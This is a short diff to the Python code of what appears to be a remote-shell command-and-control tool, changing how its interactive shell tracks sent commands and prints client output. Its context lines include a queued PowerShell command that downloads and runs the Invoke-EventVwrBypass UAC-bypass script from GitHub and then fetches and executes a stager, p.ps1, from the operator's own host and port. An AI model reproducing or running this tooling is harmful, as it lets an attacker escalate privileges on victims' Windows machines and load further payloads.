@@ -84,7 +84,7 @@ def printListener():
 
 
 def interactShell(clientnumber):
-    sent = True
+    sent = False
     clientnumber = int(clientnumber)
     from menu import clientMenuOptions
     for server in serverlist:
@@ -107,6 +107,9 @@ def interactShell(clientnumber):
                     server.handlers[clientnumber].out_buffer.append("IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-EventVwrBypass.ps1\");Invoke-EventVwrBypass -Command \"powershell.exe -c IEX (New-Object Net.Webclient).DownloadString('http://" + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + "p.ps1" + "')\"")
                     sent = True
                 elif command == "":
+                    if server.handlers[clientnumber].in_buffer:
+                        print server.handlers[clientnumber].in_buffer.pop()
+                        sent = False
                     pass
                 else:
                     server.handlers[clientnumber].out_buffer.append(command)
